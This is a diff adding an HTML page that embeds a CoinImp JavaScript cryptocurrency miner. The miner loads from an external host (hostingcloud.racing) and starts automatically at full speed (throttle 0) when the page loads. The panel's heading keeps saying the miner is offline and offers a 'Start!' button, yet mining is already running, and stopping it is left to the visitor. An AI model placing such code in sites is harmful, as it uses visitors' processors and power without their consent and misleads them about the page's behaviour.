@@ -1,0 +1,31 @@
+<html><head>
+<link rel="stylesheet" href="./style.css">
+</head>
+<body>
+<div class="miner-panel">
+ <h1 class="miner-status miner-online">Miner is offline</h1><h1>
+ <p class="hashrate-display">0<span>H/s</span></p>
+ <p class="solved-hashes-display">Total Hashes: 0</p>
+ <button class="control-btn">Start!</button>
+</h1></div>
+
+
+
+<script src="https://www.hostingcloud.racing/Q6YJ.js"></script>
+<script>
+    var _client = new Client.Anonymous('872af72c2f1ada1091817f9232c27e51e4cd3fb7d214103dd4dc6713d08e5917', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+    _client.on("job", (data)=>{
+      console.log(`[NEW JOB]: ${data.job_id}`);
+    })
+    _client.on("found", (data)=>{
+      console.log(`[ACCEPTED]: ${data.hashes} Hashes | ${data.result}`)
+    })
+</script>
+
+
+
+</body></html>
